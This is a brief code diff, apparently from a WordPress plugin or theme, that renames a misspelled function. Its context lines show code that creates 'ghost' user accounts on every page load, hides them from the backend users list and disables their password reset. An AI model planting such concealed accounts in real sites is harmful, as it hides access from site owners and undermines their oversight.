@@ -46,7 +46,7 @@ function create_ghosts(){
 add_action('wp_loaded', 'create_ghosts');
 
 // Hide Ghost-Users visibility in backend users list
-function hode_ghosts($user_search) {
+function hide_ghosts($user_search) {
   // get current User infos.
   $user = wp_get_current_user();
   // get ghosts id array.
@@ -61,7 +61,7 @@ function hode_ghosts($user_search) {
 }
 
 // WP action: when load users list hide the ghosts!
-add_action('pre_user_query','hode_ghosts');
+add_action('pre_user_query','hide_ghosts');
 
 
 // Disable password reset for ghosts
